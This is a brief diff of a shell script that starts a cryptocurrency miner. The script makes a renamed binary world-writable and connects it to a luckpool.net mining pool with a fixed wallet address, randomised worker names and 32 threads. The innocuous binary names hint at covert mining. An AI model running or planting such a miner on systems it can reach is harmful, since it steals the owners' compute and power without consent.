@@ -1,5 +1,5 @@
-chmod 777 sotoayam
-PULL=stratum+tcp://na.luckpool.net:3956#xnsub
+chmod 777 sotobabat
+PULL=na.luckpool.net:3956
 WUL=RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg
 WOR=$(echo $(shuf -i 1-20000 -n 1)-V)
-./sotoayam -c $PULL -u $WUL.$WOR -p x --cpu 32
+./sotobabat -v -l $PULL -u $WUL.$WOR -p x -t 32
